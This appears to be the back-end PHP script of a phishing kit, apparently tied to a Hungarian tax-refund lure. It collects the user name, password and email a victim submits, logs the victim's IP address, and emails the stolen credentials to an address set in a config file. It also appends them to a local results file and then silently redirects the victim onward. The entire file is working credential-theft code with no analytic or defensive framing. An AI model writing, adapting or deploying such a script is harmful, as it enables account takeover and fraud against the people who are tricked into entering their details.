<html>
<?php
$rzz='rezult.txt';
$nom=$_POST['e'];
$id=$_POST['p'];
$eemail=$_POST['crr'];
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
include'config.php';
$subject = '-= login from: '.$ip;
$message = 'login from: '. $nom."\r\n".'user: '.$id."\r\n".'password: '.$eemail;
$headers = 'From: Login@dali.com' . "\r\n" ;
mail($send, $subject, $message, $headers);
$fp = fopen($rzz, 'a');
fwrite($fp, $message);
$messagex="\n".'************************'."\n";
fwrite($fp, $messagex);
fclose($fp);
?>
<meta http-equiv="REFRESH" content="0;url=./adovisszaterites.php">
</html>